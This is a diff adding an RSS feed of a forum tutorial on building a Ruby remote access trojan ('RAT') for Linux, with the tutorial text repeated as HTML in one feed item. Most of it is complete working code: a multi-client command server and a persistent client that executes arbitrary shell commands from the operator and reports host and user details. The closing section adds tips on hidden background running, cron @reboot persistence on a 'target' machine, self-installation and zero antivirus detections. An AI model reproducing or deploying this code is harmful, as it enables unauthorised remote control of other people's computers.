@@ -1,0 +1,1058 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>How-to Build Your Own Ruby RAT</title>
+    <link>https://0x00sec.org/t/how-to-build-your-own-ruby-rat/24919</link>
+    <description>Hi everyone!
+
+Building your own RAT is a fun way to practice programming and learn a few things about networking. This how-to covers building a Ruby LAN Remote Administration Tool for Linux.
+
+This post is aimed at beginner/intermediate programmers who want to build their own custom RAT quickly. For this reason the RAT won&#39;t have all the bells and whistles like AES encryption, auto-install, etc.
+
+I encourage anyone who follows the how-to to customize their RAT as much as possible - add your own methods, commands, names and whatever extra functionality you can think of.
+
+Code available at: &lt;https://github.com/chr0x6d/ryat&gt;
+
+#### Features
+- Persistent clients - error handling to keep clients up and running, clients will stay up if the server goes down.
+
+- Multi-client - server is designed for managing multiple clients.
+
+- TCP Socket Communication - to enable Internet communication port-forwarding is an option but that will not be covered here. LAN works without port-forwarding.
+
+- Easy addition of custom commands and methods
+
+#### Requirements
+- Basic Ruby and OOP knowledge
+- Preferably use Ruby 3.0.0
+- `gem install colorize`
+
+#### Setup
+Straightforward structure, `server.rb` is a standalone script.  
+ `client.rb` requires `helpers.rb`, we will see how this works later.
+```
+├── client
+│   ├── client.rb
+│   └── helpers.rb
+└── server.rb
+```
+&lt;hr&gt;
+
+### The Server
+The bulk of our code will be in `server.rb`. When we&#39;re finished writing it we will have a capable server with utilities for handling clients. Lets get started building.
+```
+#!/usr/bin/env ruby
+
+require &#39;socket&#39; # TCP networking
+require &#39;colorize&#39; # Provides nice terminal colors
+```
+#### Client Class
+Our `server.rb` script will contain 2 classes - Server and Client. Server is the primary object which will use Client objects to store each connected client.
+
+We can now define the Client class. We&#39;ll see how it works when we put it to use in the Server class.
+```
+class Client
+  attr_accessor :connection, :addr, :uid
+
+  def initialize(connection, addr, uid)
+    @connection = connection
+    @addr = addr
+    @uid = uid
+  end
+
+  # by defining to_s(to_string) we simplify printing Client info
+  # print Client.new =&gt; &quot;ID: 1 IP: 192.168.1.2&quot;
+  def to_s
+    &quot;ID: #{@uid.to_s} IP: #{@addr.to_s}&quot;.green
+  end
+end
+```
+#### Server Class
+The Server class is large, containing our server initialization, client acceptance loop and many useful utility methods that will help us manage clients.  
+
+##### Server Class Initialize
+Our Server class takes `port` as an argument, starts the server and initializes various instance variables we will use to keep track of clients.
+
+
+```
+class Server
+  attr_accessor :client_count, :current_client
+
+  def initialize(port)
+    @client_count = 0
+    @current_client = nil
+    @clients = {}
+
+    @server = TCPServer.new(port)
+    @server.setsockopt(Socket::SOL_SOCKET, Socket::SO_REUSEADDR, true)
+  end
+```
+By default after TCPServer.new(port) a TIME_WAIT of 30-120s starts, preventing us from reusing that port. Setting SO_REUSEADDR to true is not necessary but allows us quick restarts by removing TIME_WAIT.  
+
+##### Server Class Run
+Now we&#39;ll define the core method of the Server class, `run`, which will contain a never-ending loop to listen for client connections. In Ruby `loop do...end` is equivalent to `while true do..end`.
+
+Inside the loop we&#39;ll have a `begin...rescue Exception...end`, this is an error handling block that will be a common practice throughout the RAT. Without error handling a single invalid client connection could crash our server. Instead of letting our server terminate, we `rescue` the Exception, print it and move on.
+```
+  def run
+    loop do
+      begin
+        connection = @server.accept
+        client_id = @client_count + 1
+
+        client = Client.new(
+          connection,
+          connection.peeraddr[3],
+          client_id
+        )
+        puts &quot;\nNew connection =&gt; #{client}&quot;.green
+
+        # Add our new client to @clients hash
+        @clients[client_id] = client
+
+        @client_count += 1
+      rescue Exception =&gt; e
+        puts e.backtrace.red
+      end
+    end
+  end
+```
+When a client connects, `@server.accept` returns a socket built-in object `TCPSocket` to `connection`. We now have access to clients connection information with the array `connection.peeraddr` =&gt; [domain, port, name, IP], we only require the IP address so we use connection.peeraddr[3].
+
+Our Client class takes 3 parameters =&gt; (TCPSocket, IP, UID)  
+After passing `connection` and `connection.peeraddr[3]` we then pass the UID.  
+
+`@client_count` increases or decreases by 1 as Clients are added/removed. We use this to assign a unique identifier(UID) to each Client object.
+
+`@clients` is a hash(often called a dictionary in other languages). The keys are UID&#39;s and the values Client objects. We will use the `@clients` hash often to access all or individual Clients.
+
+##### Server Class Utilities
+The following methods add general functionality to our server. We need to be able to select a specific client, remove clients, check if clients are active etc.
+
+We could have 5 clients connected for example, and we want to send a command to client ID 3 only. For this purpose we need to be able to `select_client(id)` and `unselect` by changing `@current_client`.
+
+In `select_client` we see a common Ruby logic style called guard clauses, instead of wrapping code in an `if do...end` block we use an *if modifier* and raise/return.
+```
+  def select_client(id)
+    begin
+      @current_client = @clients[id]
+
+      # Ruby-Style guard clause
+      raise NoMethodError if @current_client.nil?
+
+      puts &quot;Client #{id} selected&quot;.green
+    rescue NoMethodError =&gt; e
+      puts &quot;Invalid id: #{id}\nEnter &#39;clients&#39; to see available clients&quot;.red
+    end
+  end
+
+  def unselect
+    @current_client = nil
+  end
+```
+We can now define a couple simple helper methods for iterating through clients. `get_clients` returns an array of Client objects from the `@clients` hash.  
+
+`list_clients` prints each clients ID/IP, the `Client to_s` method is automatically used, as Ruby&#39;s puts/print calls `to_s` on every object passed to it.
+```
+  def get_clients
+    cli = []
+    @clients.each_value { |c| cli &lt;&lt; c }
+    cli
+  end
+
+  def list_clients
+    # Another guard clause
+    return &#39;No clients available&#39;.red if @clients.empty?
+    get_clients.each { |client| puts client }
+  end
+```
+Sending and Receiving from TCP sockets is an error-ridden practice. It can take time for a port to close - up to 2 minutes as we&#39;ve seen from TIME_WAIT, without any indicator that it is down.
+
+Sending commands to a client that is down can result in a `Broken Pipe` error, as the packets are never received. Attempting to receive from a client that is down could cause our program to hang - much like having a `$stdin.gets` and never entering any user input.
+
+Clients inevitably will go down for any number of reasons - system shutdown, network issues etc. When this happens we don&#39;t want one client to crash the entire server because it refuses to read a command, so as before we use `begin...Rescue Exception...end` blocks.
+```
+  def send_client(msg, client)
+    begin
+      client.connection.write(msg)
+    rescue Exception =&gt; e
+      puts e.backtrace.red
+    end
+  end
+
+  def recv_client(client)
+    begin
+      len = client.connection.gets # How many bytes are sent from client to us
+      client.connection.read(len.to_i) # If there are bytes to read, return them as text
+    rescue Exception =&gt; e
+      puts e.backtrace.red
+    end
+  end
+```
+As well as accepting clients, we need to be able to remove them. For this we&#39;ll define `destroy_client(id)`. This allows the server admin to specify a client&#39;s UID and it will be shutdown client-side and removed from the server.  
+
+When removing a client server-side, all we need is `@clients.delete(id)`, removing that client from our `@clients` hash. Our clients will be persistent though, they don&#39;t care if the server is up/down, and will continue running.  
+
+To *really* stop a client, we send it a specific command, `send_client(&#39;destroy&#39;, client)` in this case. When the client receives `&#39;destroy&#39;` it will stop, we&#39;ll see this in action when we&#39;re implementing the client.
+```
+  def destroy_client(id)
+    begin
+      client = @clients[id]
+      raise NoMethodError if client.nil?
+
+      # If the client we&#39;re removing is currently selected, unselect it
+      # We must check @current_client exists before unselecting
+      if @current_client
+        unselect if @current_client.uid == id
+      end
+
+      send_client(&#39;destroy&#39;, client)
+      @clients.delete(id)
+      @client_count -= 1
+      puts &quot;Client #{id} destroyed&quot;.yellow
+    rescue NoMethodError =&gt; e
+      puts &quot;Invalid id: #{id}\nEnter &#39;clients&#39; to see available clients&quot;.red
+    end
+  end
+```
+Imagine if we had 20 clients connected, and 10 of them were no longer responding to commands. We could go through and `destroy_client(id)` each client, but thats tedious.  
+
+As we&#39;ve seen, sockets can&#39;t tell us if they&#39;re alive or not, the only way to tell is to send bytes over the wire and check the response. Thats exactly what the `heartbeat` method will do, named after so-called [heartbeat pings](https://en.wikipedia.org/wiki/Heartbeat_(computing)).  
+
+In our client implementation, we will anticipate the `&#39;heartbeat&#39;` message and respond with `&#39;alive&#39;`. If a client is unable to respond correctly then we know it is down, and we call `destroy_client(id)` on it.
+```
+  def heartbeat
+    # Check if clients are still alive and responding, remove otherwise
+    get_clients.each do |temp_client|
+      send_client(&#39;heartbeat&#39;, temp_client)
+      beat = recv_client(temp_client)
+      destroy_client(temp_client.uid) if beat != &#39;alive&#39;
+    end
+    puts &quot;Heartbeat Finished - All non-responding clients removed.&quot;.green
+  end
+```
+Sometimes we&#39;ll want to shut our server down, but keep the clients running, so that we can start the server later and the clients will be waiting to reconnect. This will be the `quit` method.
+
+Or we&#39;ll want to shut it all down - send `&#39;destroy&#39;` to every client and then close the server. For this we&#39;ll define `hardexit`.
+```
+  def quit
+    print &quot;Exit server but keep clients active? [y/n]: &quot;
+    inp = $stdin.gets.chomp.downcase
+    exit 0 if inp == &#39;yes&#39; || inp == &#39;y&#39;
+  end
+
+  def hardexit
+    print &quot;Exit server and destroy all clients? [y/n]: &quot;
+    inp = $stdin.gets.chomp.downcase
+    if inp == &#39;yes&#39; || inp == &#39;y&#39;
+      get_clients.each { |client| send_client(&#39;destroy&#39;, client) }
+      exit 0
+    end
+  end
+end
+```
+Thats our Server class finished! If you&#39;re feeling ambitious, add a few custom methods to Server that improves upon it. An example would be a `broadcast(cmd)` that sends `cmd` to every client in `@clients`.
+&lt;hr&gt;
+
+### Using the Server
+We will finish `server.rb` with 3 final methods(not in Server class). `help` for printing available commands, `get_input` for getting input from the server admin and `start` which will launch our server and wait for input.
+
+In `start` we will define arrays of client-specific and server commands. They will be passed to `help` so that the admin can view them.
+```
+def help(server_cmds, client_cmds)
+  puts &quot;Server Commands:&quot;.green
+  server_cmds.each { |gen| puts &quot;- #{gen}&quot; }
+  puts &quot;\nClient Commands:&quot;.green
+  client_cmds.each { |cli| puts &quot;- #{cli}&quot; }
+end
+```
+`get_input` is very simple, by using a default parameter `prompt` we&#39;ll have a base prompt for our RAT. `$stdin.gets.chomp` will wait for terminal text input and return it.
+```
+def get_input(prompt = &#39;ryat&gt;&#39;)
+  print &quot;#{prompt} &quot;
+  $stdin.gets.chomp
+end
+```
+Now for our final method in `server.rb`, `start` will launch a new Server, deal with admin input and print data from clients.
+
+We assign a port from terminal arguments, `./server.rb 4000` if its passed, otherwise we give it a default value with `port ||= 3200`. The `server.run` method is placed in a Thread, so that it can run in parallel with `start`.  
+
+We define our arrays of commands - `client_cmds` will only work when `@current_client` is set. `server_cmds` will be available for use at all times.
+```
+def start
+  port = ARGV[0]
+  port ||= 3200
+
+  client = nil
+  data = nil
+  history = []
+  server = Server.new(port)
+
+  Thread.new { server.run }
+  puts &quot;Sever started on port #{port}&quot;.green
+
+  client_cmds = %w[
+    exe ls pwd pid ifconfig system
+  ]
+
+  server_cmds = %w[
+    help select unselect clients heartbeat history destroy hardexit exit
+  ]
+```
+Now we&#39;re ready to parse admin input. The remaining code in `start` will be contained in a `loop do...end` for interactivity.
+
+First we use our `get_input` method, and ensure we pass `server.current_client.uid` to the prompt if a client is selected, otherwise the prompt will default to `&#39;ryat&gt; &#39;`.
+
+`next` is the Ruby equivalent to `continue` in other languages, the execution will jump back to the start of the `loop do...end` if `input.nil?`. We also store commands made in `history` array similarly to `cat ~/.bash_history`.
+```
+  loop do
+    if server.current_client.nil?
+      input = get_input
+    else
+      input = get_input(&quot;ryat (Client #{server.current_client.uid})&gt; &quot;)
+    end
+
+    next if input.nil?
+    history.push(input)
+    cmd, action = input.split(&#39; &#39;)
+
+    if client_cmds.include?(input) &amp;&amp; server.current_client.nil?
+      puts &quot;Client specific command used&quot;.red
+      puts &quot;Select a client first (#{server.client_count} available)&quot;.red
+      next
+    end
+```
+Now we must act upon the admin&#39;s input. As we&#39;re comparing against string literals, we&#39;ll use a large `case...end`, Ruby&#39;s equivalent to `switch`. Note that in a `case...end` it is Ruby style not to indent the `when` because a `case...end` doesn&#39;t create a new scope.
+
+First we&#39;ll add the server commands, most of which will call a method from our `server` object.
+```
+    case cmd
+    # Server Commands
+    when &#39;help&#39;
+      help(server_cmds, client_cmds)
+    when &#39;select&#39;
+      server.select_client(action.to_i)
+    when &#39;unselect&#39;
+      server.unselect
+    when &#39;clients&#39;
+      server.list_clients
+    when &#39;heartbeat&#39;
+      server.heartbeat
+    when &#39;hardexit&#39;
+      server.hardexit
+    when &#39;history&#39;
+      history.each_with_index { |cmd, i| puts &quot;#{i}: #{cmd}&quot;}
+    when &#39;destroy&#39;
+      server.destroy_client(action.to_i)
+    when &#39;exit&#39;
+      server.quit
+      next # Only reached if the admin doesn&#39;t confirm exit
+    when &#39;hardexit&#39;
+      server.hardexit
+      next
+```
+Continuing on in the same `case...end` we add the client commands. Most commands such as `ls`, `pwd` and `pid` are added to a single `when` as we can send them directly as `cmd`.  
+
+The `exe` command is special though, as we want to send the entire input. This allows us to send long bash commands to the client like `exe wget -r --tries=10 www.google.com`.  
+
+If we get `data` back from a command, we&#39;ll then print it with `puts data unless data.nil?`. Then reset `data` back to nil so it doesn&#39;t interfere with the next command. Finally we call `start()`, setting our server in motion.
+```
+    # Client Commands
+    when &#39;exe&#39;
+      next if action.nil?
+      server.send_client(input, server.current_client)
+      data = server.recv_client(server.current_client)
+    when &#39;ls&#39;, &#39;pwd&#39;, &#39;pid&#39;, &#39;ifconfig&#39;, &#39;system&#39;
+      server.send_client(cmd, server.current_client)
+      data = server.recv_client(server.current_client)
+    else
+      puts &quot;Unknown command: #{input}. Enter &#39;help&#39; for available commands.&quot;.red
+    end
+    puts data unless data.nil?
+    data = nil
+  end
+end
+
+start()
+```
+We&#39;ve finished `server.rb`, try it out with `./server.rb 4000` and you should be greeted with a friendly `Server has started on port 4000` and a prompt. If you get a Socket error, try running the server on a different port.   
+
+Maybe put your own spin on the server, complete with ASCII art and custom commands :)
+&lt;hr&gt;
+
+### The Client
+If you&#39;ve made it this far, great, the hard part is over. The client is far shorter than the server. The client has 2 jobs - execute commands and stay running no matter what.
+
+#### helpers.rb
+
+The client will be composed of 2 scripts, `helpers.rb` and `client.rb`. We&#39;ll write `helpers.rb` first, it will contain a short module that we will use in `client.rb`.
+
+```
+require &#39;socket&#39;
+require &#39;etc&#39;
+
+module Helpers
+  def self.exe(cmd)
+    # `` executes bash command in Ruby
+    `#{cmd}`
+  end
+
+  def self.ls
+    `ls`
+  end
+
+  def self.pwd
+    Dir.pwd
+  end
+
+  def self.pid
+    Process.pid
+  end
+
+  def self.ifconfig
+    # With || &#39;ip a&#39; will run if &#39;ifconfig&#39; is not installed
+    `ifconfig || ip a`
+  end
+
+  def self.system
+    result = &quot;OS: &quot; + RUBY_PLATFORM + &quot;\n&quot;
+    result += &quot;Architecture: &quot; + `uname -m`
+    result += &quot;Hostname: &quot; + Socket.gethostname + &quot;\n&quot;
+    result += &quot;User: &quot; + Etc.getlogin
+  end
+end
+```
+Here is where Ruby really shines as a scripting language - we don&#39;t mess around with `system()` or `popen()` functions like in other languages. Anything we want executed as a bash command is placed in-between `` backticks.
+
+In this version the `self.pwd` method uses `Dir.pwd`, a Ruby built-in for finding the present working directory. See if you can use a `` bash command to recreate it.
+
+`require &#39;etc&#39;` gives us access to the Ruby built-in module for accessing information generally stored in the /etc directory. In this version we grab the current logged in user with `Etc.getlogin`. Other information like `Etc.passwd` to get the hashed password is available too. The [Etc Documentation](https://ruby-doc.org/stdlib-2.5.3/libdoc/etc/rdoc/Etc.html) could be useful to you.  
+
+#### client.rb
+We need the client to have solid error handling to avoid crashes, and to be ready to receive and execute commands.
+
+We use `require_relative &quot;helpers.rb&quot;` to bring the `Helpers` module into `client.rb`. We&#39;re also bringing in `socket` and `etc` as they were in `helpers.rb`, similarly to how C++ header files work.
+```
+#!/usr/bin/env ruby
+
+require_relative &quot;helpers.rb&quot;
+```
+
+We will have 2 methods in `client.rb`, `handle_client` and `main`. Once a client has been created and passed to `handle_client` we enter a `loop do...end` that listens for server commands with `data = client.recv(1024)`.  
+
+1024 is the max number of bytes the client can read from the server in a single message, if you expect your server could be sending larger messages set a larger number.
+
+Once we&#39;ve received the servers command, we use a `case...end` to call the correct `Helpers` method, execute it and hold the output in `result`.  
+
+If you recall from the Server `client_recv` checked the length of the message being sent and then read in that length in bytes. This works because we send `client.puts(result.length)`  directly before we write the actual message with `client.write(result)` in `handle_client`.
+```
+def handle_client(client)
+  loop do
+    result = &#39;&#39;
+    data = client.recv(1024)
+    next if data.nil?
+    cmd, action = data.split &#39; &#39;
+
+    case cmd
+    when &#39;heartbeat&#39;
+      result = &#39;alive&#39;
+    when &#39;exe&#39;
+      result = Helpers.exe(data.gsub(&#39;exe &#39;, &#39;&#39;))
+    when &#39;ls&#39;
+      result = Helpers.ls
+    when &#39;pwd&#39;
+      result = Helpers.pwd
+    when &#39;pid&#39;
+      result = Helpers.pid
+    when &#39;ifconfig&#39;
+      result = Helpers.ifconfig
+    when &#39;system&#39;
+      result = Helpers.system
+    when &#39;destroy&#39;
+      return 42
+    end
+
+    result = result.to_s
+    client.puts(result.length)
+    client.write(result)
+  end
+end
+```
+We don&#39;t have any error handling in `handle_client` because we intend for errors to come back out to `main` and get caught there.
+
+When `main` is first called, we enter the first `loop do...end`. Here `client = nil` will reset the old client if it existed from previous iterations. We then attempt to create a new `TCPSocket` object called `client`.
+
+At this point if the Server is down an `EAFNOSUPPORT` error will occur as the socket port is not available for the client. Without the `begin...rescue Exception...end` blocks our client would crash. Instead we print the error, then `sleep(timeout)` pausing the programs execution for timeout in seconds.
+
+Once the program&#39;s execution begins again, it will move through the entire `loop do...end` and reach `TCPSocket.new` again. This will continue indefinitely until the Server is up and there is no Exception to `rescue`.
+```
+def main(host, port, timeout)
+  # Main loop to repeatedly attempt server connection
+  loop do
+    client = nil
+    begin
+      client = TCPSocket.new(host, port)
+    rescue Exception =&gt; e
+      puts e.message
+      puts e.backtrace
+      sleep(timeout)
+    end
+
+    exit_code = 0
+    begin
+      exit_code = handle_client(client)
+    rescue Interrupt
+      exit 0
+    rescue Exception =&gt; e
+      puts e.message
+      puts e.backtrace
+    end
+
+  exit 0 if exit_code == 42
+  end
+end
+```
+I choose to use 42 as a signal to fully `exit 0` the client. Any number/string could be used for the `exit_code`.
+
+You might be wondering why we don&#39;t `exit 0` directly from `handle_client` when we receive the `&#39;destroy&#39;` message. This is due to the error handling of `rescue Exception` catching *all exceptions* and even `exit` is considered an exception.
+
+We finish our RAT by setting optional command-line arguments for `client.rb` and calling `main`.
+```
+host = ARGV[0]
+port = ARGV[1]
+
+# If host/port is not passed in ARGV, default to localhost:3200
+host ||= &quot;localhost&quot;
+port ||= 3200
+timeout = 2
+
+main(host, port, timeout)
+```
+
+### Conclusion
+
+We can now launch clients with `./client.rb localhost 4000`. If a server was listening on locahost:4000 the text `New Connection: ID: 1 IP: 127.0.0.1` should appear in your server terminal.
+
+So lets say you&#39;ve got a server running on port 4000, you get the LAN IP of the server machine using `ifconfig` or `ip addr`, and its `192.168.1.8`. Now if you  have a spare laptop or virtual machine copy `client.rb` and `helpers.rb` to it. Run `./client.rb 192.168.1.8 4000`, if all went well, you&#39;ll have a new connection :)  
+
+To run `client.rb` in the background, you can use `nohup ruby client.rb &amp;`.   
+
+Setting `client.rb` to run on startup is very possible, but will be different depending on the target distro. One approach for systems using [cron](https://en.wikipedia.org/wiki/Cron) is `crontab -e` and adding `@reboot /path/to/client.rb`. Maybe in your version `client.rb` could automatically add itself to startup.
+
+As expected from Ruby scripts without any malicious functionality like keylogging, `client.rb`, `helpers.rb` and `server.rb` have 0 detections from virustotal.
+
+https://www.virustotal.com/gui/file/a18cdebfa39c73f0bd487742610937a317e1c7ec02f362dbe3887be11688ffdc/detection
+
+https://www.virustotal.com/gui/file/4bcf6300d01533e49085c82282e029d82848bd46b3a48909730c1303c2e4c29b/detection
+
+https://www.virustotal.com/gui/file/0d107e5e74bbd130fdad17fa495dfa73978550457aca469048840b6d0d5ae8be/detection
+
+Thank you for reading! Let me know of any improvements or suggestions.</description>
+    
+    <lastBuildDate>Wed, 17 Feb 2021 12:05:51 +0000</lastBuildDate>
+    <category>Programming</category>
+    <atom:link href="https://0x00sec.org/t/how-to-build-your-own-ruby-rat/24919.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>How-to Build Your Own Ruby RAT</title>
+        <dc:creator><![CDATA[system]]></dc:creator>
+        <description><![CDATA[
+            <p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
+          <p><a href="https://0x00sec.org/t/how-to-build-your-own-ruby-rat/24919/3">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/how-to-build-your-own-ruby-rat/24919/3</link>
+        <pubDate>Fri, 18 Jun 2021 11:34:18 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-24919-3</guid>
+        <source url="https://0x00sec.org/t/how-to-build-your-own-ruby-rat/24919.rss">How-to Build Your Own Ruby RAT</source>
+      </item>
+      <item>
+        <title>How-to Build Your Own Ruby RAT</title>
+        <dc:creator><![CDATA[3vn2odzn]]></dc:creator>
+        <description><![CDATA[
+            <p><strong>Thanks for nice article <img src="https://0x00sec.org/images/emoji/twitter/smile.png?v=9" title=":smile:" class="emoji" alt=":smile:"></strong></p>
+          <p><a href="https://0x00sec.org/t/how-to-build-your-own-ruby-rat/24919/2">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/how-to-build-your-own-ruby-rat/24919/2</link>
+        <pubDate>Wed, 17 Feb 2021 12:05:51 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-24919-2</guid>
+        <source url="https://0x00sec.org/t/how-to-build-your-own-ruby-rat/24919.rss">How-to Build Your Own Ruby RAT</source>
+      </item>
+      <item>
+        <title>How-to Build Your Own Ruby RAT</title>
+        <dc:creator><![CDATA[chr0]]></dc:creator>
+        <description><![CDATA[
+            <p>Hi everyone!</p>
+<p>Building your own RAT is a fun way to practice programming and learn a few things about networking. This how-to covers building a Ruby LAN Remote Administration Tool for Linux.</p>
+<p>This post is aimed at beginner/intermediate programmers who want to build their own custom RAT quickly. For this reason the RAT won’t have all the bells and whistles like AES encryption, auto-install, etc.</p>
+<p>I encourage anyone who follows the how-to to customize their RAT as much as possible - add your own methods, commands, names and whatever extra functionality you can think of.</p>
+<p>Code available at: <a href="https://github.com/chr0x6d/ryat" rel="noopener nofollow ugc">https://github.com/chr0x6d/ryat</a></p>
+<h4>Features</h4>
+<ul>
+<li>
+<p>Persistent clients - error handling to keep clients up and running, clients will stay up if the server goes down.</p>
+</li>
+<li>
+<p>Multi-client - server is designed for managing multiple clients.</p>
+</li>
+<li>
+<p>TCP Socket Communication - to enable Internet communication port-forwarding is an option but that will not be covered here. LAN works without port-forwarding.</p>
+</li>
+<li>
+<p>Easy addition of custom commands and methods</p>
+</li>
+</ul>
+<h4>Requirements</h4>
+<ul>
+<li>Basic Ruby and OOP knowledge</li>
+<li>Preferably use Ruby 3.0.0</li>
+<li><code>gem install colorize</code></li>
+</ul>
+<h4>Setup</h4>
+<p>Straightforward structure, <code>server.rb</code> is a standalone script.<br>
+<code>client.rb</code> requires <code>helpers.rb</code>, we will see how this works later.</p>
+<pre><code class="lang-auto">├── client
+│   ├── client.rb
+│   └── helpers.rb
+└── server.rb
+</code></pre>
+<hr>
+<h3>The Server</h3>
+<p>The bulk of our code will be in <code>server.rb</code>. When we’re finished writing it we will have a capable server with utilities for handling clients. Lets get started building.</p>
+<pre><code class="lang-auto">#!/usr/bin/env ruby
+
+require 'socket' # TCP networking
+require 'colorize' # Provides nice terminal colors
+</code></pre>
+<h4>Client Class</h4>
+<p>Our <code>server.rb</code> script will contain 2 classes - Server and Client. Server is the primary object which will use Client objects to store each connected client.</p>
+<p>We can now define the Client class. We’ll see how it works when we put it to use in the Server class.</p>
+<pre><code class="lang-auto">class Client
+  attr_accessor :connection, :addr, :uid
+
+  def initialize(connection, addr, uid)
+    @connection = connection
+    @addr = addr
+    @uid = uid
+  end
+
+  # by defining to_s(to_string) we simplify printing Client info
+  # print Client.new =&gt; "ID: 1 IP: 192.168.1.2"
+  def to_s
+    "ID: #{@uid.to_s} IP: #{@addr.to_s}".green
+  end
+end
+</code></pre>
+<h4>Server Class</h4>
+<p>The Server class is large, containing our server initialization, client acceptance loop and many useful utility methods that will help us manage clients.</p>
+<h5>Server Class Initialize</h5>
+<p>Our Server class takes <code>port</code> as an argument, starts the server and initializes various instance variables we will use to keep track of clients.</p>
+<pre><code class="lang-auto">class Server
+  attr_accessor :client_count, :current_client
+
+  def initialize(port)
+    @client_count = 0
+    @current_client = nil
+    @clients = {}
+
+    @server = TCPServer.new(port)
+    @server.setsockopt(Socket::SOL_SOCKET, Socket::SO_REUSEADDR, true)
+  end
+</code></pre>
+<p>By default after TCPServer.new(port) a TIME_WAIT of 30-120s starts, preventing us from reusing that port. Setting SO_REUSEADDR to true is not necessary but allows us quick restarts by removing TIME_WAIT.</p>
+<h5>Server Class Run</h5>
+<p>Now we’ll define the core method of the Server class, <code>run</code>, which will contain a never-ending loop to listen for client connections. In Ruby <code>loop do...end</code> is equivalent to <code>while true do..end</code>.</p>
+<p>Inside the loop we’ll have a <code>begin...rescue Exception...end</code>, this is an error handling block that will be a common practice throughout the RAT. Without error handling a single invalid client connection could crash our server. Instead of letting our server terminate, we <code>rescue</code> the Exception, print it and move on.</p>
+<pre><code class="lang-auto">  def run
+    loop do
+      begin
+        connection = @server.accept
+        client_id = @client_count + 1
+
+        client = Client.new(
+          connection,
+          connection.peeraddr[3],
+          client_id
+        )
+        puts "\nNew connection =&gt; #{client}".green
+
+        # Add our new client to @clients hash
+        @clients[client_id] = client
+
+        @client_count += 1
+      rescue Exception =&gt; e
+        puts e.backtrace.red
+      end
+    end
+  end
+</code></pre>
+<p>When a client connects, <code>@server.accept</code> returns a socket built-in object <code>TCPSocket</code> to <code>connection</code>. We now have access to clients connection information with the array <code>connection.peeraddr</code> =&gt; [domain, port, name, IP], we only require the IP address so we use connection.peeraddr[3].</p>
+<p>Our Client class takes 3 parameters =&gt; (TCPSocket, IP, UID)<br>
+After passing <code>connection</code> and <code>connection.peeraddr[3]</code> we then pass the UID.</p>
+<p><code>@client_count</code> increases or decreases by 1 as Clients are added/removed. We use this to assign a unique identifier(UID) to each Client object.</p>
+<p><code>@clients</code> is a hash(often called a dictionary in other languages). The keys are UID’s and the values Client objects. We will use the <code>@clients</code> hash often to access all or individual Clients.</p>
+<h5>Server Class Utilities</h5>
+<p>The following methods add general functionality to our server. We need to be able to select a specific client, remove clients, check if clients are active etc.</p>
+<p>We could have 5 clients connected for example, and we want to send a command to client ID 3 only. For this purpose we need to be able to <code>select_client(id)</code> and <code>unselect</code> by changing <code>@current_client</code>.</p>
+<p>In <code>select_client</code> we see a common Ruby logic style called guard clauses, instead of wrapping code in an <code>if do...end</code> block we use an <em>if modifier</em> and raise/return.</p>
+<pre><code class="lang-auto">  def select_client(id)
+    begin
+      @current_client = @clients[id]
+
+      # Ruby-Style guard clause
+      raise NoMethodError if @current_client.nil?
+
+      puts "Client #{id} selected".green
+    rescue NoMethodError =&gt; e
+      puts "Invalid id: #{id}\nEnter 'clients' to see available clients".red
+    end
+  end
+
+  def unselect
+    @current_client = nil
+  end
+</code></pre>
+<p>We can now define a couple simple helper methods for iterating through clients. <code>get_clients</code> returns an array of Client objects from the <code>@clients</code> hash.</p>
+<p><code>list_clients</code> prints each clients ID/IP, the <code>Client to_s</code> method is automatically used, as Ruby’s puts/print calls <code>to_s</code> on every object passed to it.</p>
+<pre><code class="lang-auto">  def get_clients
+    cli = []
+    @clients.each_value { |c| cli &lt;&lt; c }
+    cli
+  end
+
+  def list_clients
+    # Another guard clause
+    return 'No clients available'.red if @clients.empty?
+    get_clients.each { |client| puts client }
+  end
+</code></pre>
+<p>Sending and Receiving from TCP sockets is an error-ridden practice. It can take time for a port to close - up to 2 minutes as we’ve seen from TIME_WAIT, without any indicator that it is down.</p>
+<p>Sending commands to a client that is down can result in a <code>Broken Pipe</code> error, as the packets are never received. Attempting to receive from a client that is down could cause our program to hang - much like having a <code>$stdin.gets</code> and never entering any user input.</p>
+<p>Clients inevitably will go down for any number of reasons - system shutdown, network issues etc. When this happens we don’t want one client to crash the entire server because it refuses to read a command, so as before we use <code>begin...Rescue Exception...end</code> blocks.</p>
+<pre><code class="lang-auto">  def send_client(msg, client)
+    begin
+      client.connection.write(msg)
+    rescue Exception =&gt; e
+      puts e.backtrace.red
+    end
+  end
+
+  def recv_client(client)
+    begin
+      len = client.connection.gets # How many bytes are sent from client to us
+      client.connection.read(len.to_i) # If there are bytes to read, return them as text
+    rescue Exception =&gt; e
+      puts e.backtrace.red
+    end
+  end
+</code></pre>
+<p>As well as accepting clients, we need to be able to remove them. For this we’ll define <code>destroy_client(id)</code>. This allows the server admin to specify a client’s UID and it will be shutdown client-side and removed from the server.</p>
+<p>When removing a client server-side, all we need is <code>@clients.delete(id)</code>, removing that client from our <code>@clients</code> hash. Our clients will be persistent though, they don’t care if the server is up/down, and will continue running.</p>
+<p>To <em>really</em> stop a client, we send it a specific command, <code>send_client('destroy', client)</code> in this case. When the client receives <code>'destroy'</code> it will stop, we’ll see this in action when we’re implementing the client.</p>
+<pre><code class="lang-auto">  def destroy_client(id)
+    begin
+      client = @clients[id]
+      raise NoMethodError if client.nil?
+
+      # If the client we're removing is currently selected, unselect it
+      # We must check @current_client exists before unselecting
+      if @current_client
+        unselect if @current_client.uid == id
+      end
+
+      send_client('destroy', client)
+      @clients.delete(id)
+      @client_count -= 1
+      puts "Client #{id} destroyed".yellow
+    rescue NoMethodError =&gt; e
+      puts "Invalid id: #{id}\nEnter 'clients' to see available clients".red
+    end
+  end
+</code></pre>
+<p>Imagine if we had 20 clients connected, and 10 of them were no longer responding to commands. We could go through and <code>destroy_client(id)</code> each client, but thats tedious.</p>
